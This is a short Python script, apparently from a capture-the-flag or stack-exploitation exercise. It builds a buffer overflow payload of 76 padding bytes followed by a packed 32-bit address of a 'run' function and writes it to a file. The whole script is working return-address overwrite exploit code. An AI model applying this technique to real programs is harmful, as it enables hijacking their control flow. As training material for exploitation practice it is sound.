import struct

offset = 76
function_addr = 0x08048444 #Address of the run function

# Create the payload
payload = b"A" * offset
payload += struct.pack("<I", function_addr)


# Save the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)